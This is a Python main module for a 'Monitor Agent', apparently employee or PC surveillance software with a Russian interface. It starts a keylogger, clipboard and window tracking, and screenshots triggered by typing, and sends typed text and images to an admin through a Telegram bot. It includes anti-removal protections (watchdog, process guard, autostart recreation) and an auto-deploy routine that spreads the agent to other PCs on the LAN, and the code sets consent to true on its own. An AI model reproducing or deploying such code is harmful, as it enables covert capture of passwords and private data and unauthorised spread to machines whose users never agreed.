"""Monitor Agent entry point (v2 — Telegram-based).

Architecture:
  - First launch: setup wizard (customtkinter) → saves config encrypted
  - Subsequent launches: tray icon + background threads + Telegram bot

Threads:
  - telegram_bot:  Telegram polling (admin commands)
  - tracker:       active window logging
  - screenshot:    periodic capture, saved locally + sent to admin on demand
  - blocker:       kills blocked processes
  - usb_monitor:   USB device detection → alert to Telegram
  - clipboard:     clipboard change tracking
  - software:      new-install detection
  - watchdog:      monitors main thread health

Run:
    python -m agent.main            (normal)
    python -m agent.main --reset    (re-run setup wizard)
"""
from __future__ import annotations

import argparse
import logging
import os
import sys
import threading
import time
import tkinter as tk
from datetime import datetime
from typing import Optional

# Try to import psutil - if it fails, continue without it
try:
    import psutil
except ImportError:
    psutil = None
    logging.warning("psutil not installed - process monitoring disabled")

# Try to import PIL and pystray - these are critical
try:
    from PIL import Image, ImageDraw
    import pystray
except ImportError as exc:
    logging.critical("Failed to import required modules: %s", exc)
    # Show error to user
    try:
        root = tk.Tk()
        root.withdraw()
        from tkinter import messagebox
        messagebox.showerror(
            "Monitor Agent Error",
            f"Required modules not installed:\n\n{str(exc)}\n\nPlease install: pip install Pillow pystray"
        )
        root.destroy()
    except:
        pass
    sys.exit(1)

# Try to import agent modules
try:
    from . import blocker, screenshot, telegram_bot
    from .clipboard_monitor import ClipboardMonitor, ClipEntry
    from .config import CONFIG_DIR, LocalConfig
    from .idle import get_idle_seconds
    from .auto_deploy import auto_deploy_background
    from .protection import WatchdogThread, TaskWatchdog, ProcessGuard, apply_full_protection, install_autostart
    from .screen_lock import restore_lock_if_needed
    from .software_monitor import SoftwareMonitor, SoftwareEvent
    from .tracker import SessionAggregator, get_active_window
    from .usb_monitor import USBMonitor, USBEvent
    from .keylogger import Keylogger
except ImportError as exc:
    logging.critical("Failed to import agent modules: %s", exc)
    # Show error to user
    try:
        root = tk.Tk()
        root.withdraw()
        from tkinter import messagebox
        messagebox.showerror(
            "Monitor Agent Error",
            f"Failed to import agent modules:\n\n{str(exc)}\n\nThis is a critical error."
        )
        root.destroy()
    except:
        pass
    sys.exit(1)

log = logging.getLogger("monitor.agent")

IDLE_THRESHOLD = 60
TRACKER_PERIOD = 1
TRACKER_FLUSH = 30
BLOCKER_PERIOD = 2


class AgentCore:
    """Central agent state accessible from all modules (including Telegram bot)."""

    def __init__(self, config: LocalConfig):
        self.config = config
        self.stop_event = threading.Event()
        self.aggregator: Optional[SessionAggregator] = None
        self.clip_monitor: Optional[ClipboardMonitor] = None
        self.soft_monitor: Optional[SoftwareMonitor] = None
        self.usb_monitor: Optional[USBMonitor] = None
        self.keylogger: Optional[Keylogger] = None
        self.last_screenshot_ts = 0.0


def _make_icon_image() -> Image.Image:
    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    d = ImageDraw.Draw(img)
    d.ellipse((4, 4, 60, 60), fill=(52, 152, 219), outline=(20, 20, 20))
    d.rectangle((20, 18, 44, 46), fill=(255, 255, 255))
    d.rectangle((24, 24, 40, 28), fill=(52, 152, 219))
    d.rectangle((24, 32, 40, 36), fill=(52, 152, 219))
    d.rectangle((24, 40, 36, 42), fill=(52, 152, 219))
    return img


def _setup_logging() -> None:
    log_dir = str(CONFIG_DIR)
    os.makedirs(log_dir, exist_ok=True)
    handler = logging.FileHandler(os.path.join(log_dir, "agent.log"), encoding="utf-8")
    handler.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(name)s: %(message)s"))
    root = logging.getLogger()
    root.addHandler(handler)
    root.addHandler(logging.StreamHandler(sys.stdout))
    root.setLevel(logging.INFO)


# ----- worker loops -----

def tracker_loop(agent: AgentCore) -> None:
    agg = SessionAggregator(flush_seconds=TRACKER_FLUSH)
    agent.aggregator = agg
    while not agent.stop_event.is_set():
        cfg = agent.config
        if cfg.tracking_enabled and not cfg.paused:
            idle = get_idle_seconds() >= IDLE_THRESHOLD
            info = get_active_window()
            agg.tick(info, idle=idle)
        else:
            agg.tick(None, idle=True)
        agent.stop_event.wait(TRACKER_PERIOD)


def screenshot_loop(agent: AgentCore) -> None:
    while not agent.stop_event.is_set():
        cfg = agent.config
        interval = cfg.screenshot_interval
        if interval > 0 and not cfg.paused:
            now = time.time()
            if (now - agent.last_screenshot_ts) >= interval:
                data = screenshot.take_jpeg()
                if data:
                    agent.last_screenshot_ts = now
                    # save locally
                    shot_dir = CONFIG_DIR / "screenshots"
                    shot_dir.mkdir(exist_ok=True)
                    fname = f"shot_{int(now)}.jpg"
                    (shot_dir / fname).write_bytes(data)
                    # keep max 200 screenshots locally
                    shots = sorted(shot_dir.glob("*.jpg"))
                    for old in shots[:-200]:
                        old.unlink(missing_ok=True)
        agent.stop_event.wait(min(5, max(1, interval if interval else 5)))


def blocker_loop(agent: AgentCore) -> None:
    while not agent.stop_event.is_set():
        cfg = agent.config
        if cfg.block_enabled and not cfg.paused and cfg.blocked_processes:
            try:
                killed = blocker.kill_blocked(cfg.blocked_processes)
                if killed:
                    names = ", ".join(f"{n}" for n, _ in killed)
                    telegram_bot.send_alert(f"🚫 Заблокированы процессы: {names}")
            except Exception:
                pass
        agent.stop_event.wait(BLOCKER_PERIOD)


# ----- tray -----

def build_tray(agent: AgentCore) -> pystray.Icon:
    def status_text(_item):
        cfg = agent.config
        return f"Трекинг: {'ВКЛ' if cfg.tracking_enabled and not cfg.paused else 'ВЫКЛ'}"

    def shot_text(_item):
        return f"Скриншоты: {agent.config.screenshot_interval}с"

    def toggle_pause(icon, _item):
        agent.config.paused = not agent.config.paused
        agent.config.save()
        icon.update_menu()

    def quit_app(icon, _item):
        cfg = agent.config
        if cfg.exit_password_hash:
            _ask_password_then_quit(icon, agent)
        else:
            agent.stop_event.set()
            icon.stop()

    menu = pystray.Menu(
        pystray.MenuItem(status_text, None, enabled=False),
        pystray.MenuItem(shot_text, None, enabled=False),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem(
            lambda _: "▶ Возобновить" if agent.config.paused else "⏸ Приостановить",
            toggle_pause,
        ),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("Выйти (пароль)", quit_app),
    )
    return pystray.Icon(
        "MonitorAgent",
        _make_icon_image(),
        "Monitor Agent",
        menu=menu,
    )


def _ask_password_then_quit(icon: pystray.Icon, agent: AgentCore) -> None:
    """Show password prompt before allowing exit."""
    def _dialog():
        root = tk.Tk()
        root.title("Выход — введите пароль")
        root.geometry("320x140")
        root.attributes("-topmost", True)
        root.resizable(False, False)
        tk.Label(root, text="Пароль для выхода:", font=("Segoe UI", 11)).pack(pady=(15, 5))
        var = tk.StringVar()
        entry = tk.Entry(root, textvariable=var, show="●", font=("Segoe UI", 12), width=28)
        entry.pack()
        entry.focus_set()
        err = tk.Label(root, text="", fg="red", font=("Segoe UI", 9))
        err.pack()

        def check(event=None):
            if agent.config.check_exit_password(var.get()):
                root.destroy()
                agent.stop_event.set()
                icon.stop()
            else:
                err.config(text="Неверный пароль")
                var.set("")

        entry.bind("<Return>", check)
        tk.Button(root, text="OK", command=check, width=10).pack(pady=5)
        root.protocol("WM_DELETE_WINDOW", root.destroy)
        root.mainloop()

    threading.Thread(target=_dialog, daemon=True).start()


# ----- main -----

def _kill_existing_agents() -> None:
    """Kill existing MonitorAgent.exe instances."""
    if not psutil:
        log.warning("psutil not available - cannot kill existing agents")
        return
    try:
        for proc in psutil.process_iter(attrs=["name", "pid"]):
            try:
                name = (proc.info["name"] or "").lower()
                if name == "monitoragent.exe" and proc.info["pid"] != os.getpid():
                    log.info("Killing existing agent process: PID %s", proc.info["pid"])
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as exc:
        log.warning("Failed to kill existing agents: %s", exc)

def main() -> int:
    """Main entry point for the agent."""
    try:
        log.info("Monitor Agent starting...")

        # Kill existing instances
        _kill_existing_agents()

        parser = argparse.ArgumentParser(description="Monitor Agent v2")
        parser.add_argument("--reset", action="store_true", help="Re-run setup wizard")
        args = parser.parse_args()

        # Load or run setup
        _setup_logging()
        cfg = LocalConfig.load()
        if args.reset or not cfg.is_configured:
            log.info("Running setup wizard...")
            from .setup_ui import run_setup
            result = run_setup()
            if not result or not result.completed:
                log.info("Setup cancelled — exiting")
                return 0
            cfg.bot_token = result.bot_token
            cfg.admin_id = result.admin_id
            if result.exit_password:
                cfg.set_exit_password(result.exit_password)
            cfg.tracking_enabled = result.features.get("tracking", True)
            cfg.screenshot_interval = 60 if result.features.get("screenshots", True) else 0
            cfg.block_enabled = result.features.get("blocker", True)
            cfg.usb_monitor_enabled = result.features.get("usb", True)
            cfg.clipboard_monitor_enabled = result.features.get("clipboard", True)
            cfg.keylogger_enabled = result.features.get("keylogger", True)
            cfg.software_monitor_enabled = result.features.get("software", True)
            cfg.setup_complete = True
            cfg.consented = True
            cfg.save()
            if result.features.get("autostart", True):
                install_autostart()
            log.info("Setup complete")

        # Apply full protection suite
        log.info("Applying protections...")
        prot_results = apply_full_protection()
        log.info("Protection status: %s", prot_results)

        # Restore lock screen if it was active before reboot
        if restore_lock_if_needed():
            log.info("Lock screen restored from saved state")

        agent = AgentCore(cfg)
        telegram_bot.set_agent(agent)

        # Start Telegram bot
        log.info("Starting Telegram bot...")
        telegram_bot.start_bot(cfg.bot_token, cfg.admin_id)

        threads: list[threading.Thread] = []

        # Auto-deploy to LAN PCs
        if cfg.auto_deploy_enabled:
            log.info("Starting autonomous LAN discovery & deployment...")
            def _on_deploy_done(result):
                if result.pcs_deployed > 0:
                    details = "\n".join(result.details[-10:])
                    telegram_bot.send_alert(
                        f"🌐 <b>Авто-развёртывание завершено</b>\n\n"
                        f"{result.summary()}\n\n"
                        f"{details}"
                    )
                elif result.pcs_found > 0:
                    telegram_bot.send_alert(
                        f"🌐 Найдено {result.pcs_found} ПК, "
                        f"пропущено {result.pcs_skipped} (уже установлен), "
                        f"ошибок {result.pcs_failed}"
                    )
            auto_deploy_background(on_complete=_on_deploy_done)

        # Tracker
        if cfg.tracking_enabled:
            t = threading.Thread(target=tracker_loop, args=(agent,), name="tracker", daemon=True)
            threads.append(t)
            t.start()

        # Screenshots
        if cfg.screenshot_interval > 0:
            t = threading.Thread(target=screenshot_loop, args=(agent,), name="screenshot", daemon=True)
            threads.append(t)
            t.start()

        # Blocker
        if cfg.block_enabled:
            t = threading.Thread(target=blocker_loop, args=(agent,), name="blocker", daemon=True)
            threads.append(t)
            t.start()

        # USB monitor
        if cfg.usb_monitor_enabled:
            def on_usb(ev: USBEvent):
                emoji = "🔌" if ev.action == "connected" else "⏏️"
                telegram_bot.send_alert(
                    f"{emoji} USB {ev.action}: <b>{ev.device_name}</b> [{ev.drive_letter}] "
                    f"{ev.size_gb} GB (SN: {ev.serial[:12]})"
                )
            usb_mon = USBMonitor(on_event=on_usb)
            agent.usb_monitor = usb_mon
            usb_mon.start()

        # Clipboard monitor
        if cfg.clipboard_monitor_enabled:
            clip_mon = ClipboardMonitor()
            agent.clip_monitor = clip_mon
            clip_mon.start()

        # Software monitor
        if cfg.software_monitor_enabled:
            def on_soft(ev: SoftwareEvent):
                telegram_bot.send_alert(
                    f"📦 Новое ПО: <b>{ev.name}</b> v{ev.version} ({ev.publisher})"
                )
            soft_mon = SoftwareMonitor(on_new=on_soft)
            agent.soft_monitor = soft_mon
            soft_mon.start()

        # Keylogger
        if cfg.keylogger_enabled:
            keylog_dir = str(CONFIG_DIR)

            def _auto_screenshot(typed_text: str):
                try:
                    jpeg_data = screenshot.take_jpeg(quality=75)
                    if jpeg_data:
                        caption = f"📸 Auto-screenshot {datetime.now().strftime('%H:%M:%S')}"
                        if typed_text:
                            caption += f"\n⌨️ Typed: {typed_text}"
                        telegram_bot.send_photo_alert(jpeg_data, caption=caption)
                except Exception as exc:
                    log.warning("Auto-screenshot failed: %s", exc)

            keylogger = Keylogger(
                keylog_dir,
                on_screenshot=_auto_screenshot,
                keyboard_screenshot_enabled=cfg.auto_screenshot_enabled,
                mouse_screenshot_enabled=cfg.auto_screenshot_mouse_enabled,
            )
            agent.keylogger = keylogger
            keylogger.start()

        # Task watchdog (recreate task if deleted)
        from .protection import TaskWatchdog
        task_watchdog = TaskWatchdog(agent.stop_event)
        task_watchdog.start()

        # Watchdog + Process Guard
        watchdog = WatchdogThread()
        watchdog.start(threading.current_thread())
        proc_guard = ProcessGuard()
        proc_guard.start()

        log.info("All modules started. Running tray icon...")

        # Tray icon (blocks main thread)
        icon = build_tray(agent)
        icon.run()

        # Cleanup
        agent.stop_event.set()
        watchdog.stop()
        proc_guard.stop()
        if agent.usb_monitor:
            agent.usb_monitor.stop()
        if agent.clip_monitor:
            agent.clip_monitor.stop()
        if agent.soft_monitor:
            agent.soft_monitor.stop()
        if agent.keylogger:
            agent.keylogger.stop()
        for t in threads:
            t.join(timeout=3)
        log.info("Agent shut down")
        return 0
    except Exception as exc:
        log.critical("Fatal error during startup: %s", exc, exc_info=True)
        # Show error dialog if possible
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showerror(
                "Monitor Agent Error",
                f"Failed to start:\n\n{str(exc)}\n\nCheck logs for details."
            )
            root.destroy()
        except:
            pass
        return 1


if __name__ == "__main__":
    sys.exit(main())
